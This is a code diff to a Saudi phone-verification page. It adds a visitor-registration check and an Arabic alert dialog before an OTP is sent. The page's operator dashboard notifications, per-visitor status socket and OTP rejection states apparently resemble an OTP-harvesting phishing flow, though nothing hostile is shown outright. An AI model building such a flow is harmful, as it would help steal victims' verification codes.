@@ -6,6 +6,16 @@ import { Button } from "@/components/ui/button"
 import { Card } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog"
 import { Phone, ShieldCheck, CreditCard } from "lucide-react"
 import { UnifiedSpinner } from "@/components/unified-spinner"
 import { StcVerificationModal } from "@/components/stc-verification-modal"
@@ -13,7 +23,7 @@ import { MobilyVerificationModal } from "@/components/mobily-verification-modal"
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal"
 import { PhoneOtpDialog } from "@/components/dialog-b"
 
-import { addData, getData, submitVisitorFormData, notifyDashboard } from "@/lib/api"
+import { addData, getData, submitVisitorFormData, notifyDashboard, checkVisitorRegistration } from "@/lib/api"
 import { onVisitorStatusUpdated } from "@/lib/socket"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
@@ -31,6 +41,9 @@ export default function VerifyPhonePage() {
   const [otpRejectionError, setOtpRejectionError] = useState("")
   const [phoneError, setPhoneError] = useState("")
   const [phoneRejectionMessage, setPhoneRejectionMessage] = useState("")
+  const [showRegistrationAlert, setShowRegistrationAlert] = useState(false)
+  const [registrationMessage, setRegistrationMessage] = useState("")
+  const [isCheckingRegistration, setIsCheckingRegistration] = useState(false)
 
   // Saudi telecom operators
   const telecomOperators = [
@@ -231,8 +244,31 @@ export default function VerifyPhonePage() {
     console.log('[handleSendOtp] visitorID:', visitorID);
     if (!visitorID) {
       console.log('[handleSendOtp] No visitorID in localStorage');
+      setRegistrationMessage("لم يتم العثور على معرف الزائر. يرجى بدء التسجيل من جديد.");
+      setShowRegistrationAlert(true);
       return;
     }
+
+    // First, check if visitor is registered in home-new page
+    setIsCheckingRegistration(true);
+    try {
+      const checkResult = await checkVisitorRegistration(visitorID);
+      console.log('[handleSendOtp] Registration check:', checkResult);
+      
+      if (!checkResult.isRegistered) {
+        setRegistrationMessage(checkResult.message || "لا يوجد لديك سجل. يرجى إعادة التسجيل.");
+        setShowRegistrationAlert(true);
+        setIsCheckingRegistration(false);
+        return;
+      }
+    } catch (error) {
+      console.error('[handleSendOtp] Registration check failed:', error);
+      setRegistrationMessage("فشل في التحقق من التسجيل. يرجى المحاولة مرة أخرى.");
+      setShowRegistrationAlert(true);
+      setIsCheckingRegistration(false);
+      return;
+    }
+    setIsCheckingRegistration(false);
 
     try {
       console.log('[handleSendOtp] Submitting form data...');
@@ -478,10 +514,10 @@ export default function VerifyPhonePage() {
             <Button
               onClick={handleSendOtp}
               className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] disabled:opacity-50 disabled:cursor-not-allowed"
-              disabled={!phoneNumber || !selectedCarrier || phoneNumber.length !== 10 || !!phoneError}
+              disabled={!phoneNumber || !selectedCarrier || phoneNumber.length !== 10 || !!phoneError || isCheckingRegistration}
             >
               <Phone className="ml-2 h-5 w-5" />
-              إرسال رمز التحقق
+              {isCheckingRegistration ? "جاري التحقق..." : "إرسال رمز التحقق"}
             </Button>
 
             {/* Info Box */}
@@ -529,6 +565,36 @@ export default function VerifyPhonePage() {
         onShowWaitingModal={handleShowWaitingModal}
         rejectionError={otpRejectionError}
       />
+
+      {/* Registration Alert Dialog */}
+      <AlertDialog open={showRegistrationAlert} onOpenChange={setShowRegistrationAlert}>
+        <AlertDialogContent className="max-w-md">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-right text-xl">⚠️ تنبيه</AlertDialogTitle>
+            <AlertDialogDescription className="text-right text-base">
+              {registrationMessage || "لا يوجد لديك سجل. يرجى إعادة التسجيل."}
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter className="flex-row-reverse gap-2">
+            <AlertDialogCancel className="bg-gray-100 hover:bg-gray-200 text-gray-800">
+              إلغاء
+            </AlertDialogCancel>
+            <AlertDialogAction 
+              className="bg-[#1a5c85] hover:bg-[#154a6d] text-white"
+              onClick={() => {
+                setShowRegistrationAlert(false);
+                // Clear localStorage and redirect to home-new
+                if (typeof window !== 'undefined') {
+                  localStorage.removeItem('visitor');
+                }
+                window.location.href = '/home-new';
+              }}
+            >
+              تسجيل جديد
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </>
   )
 }
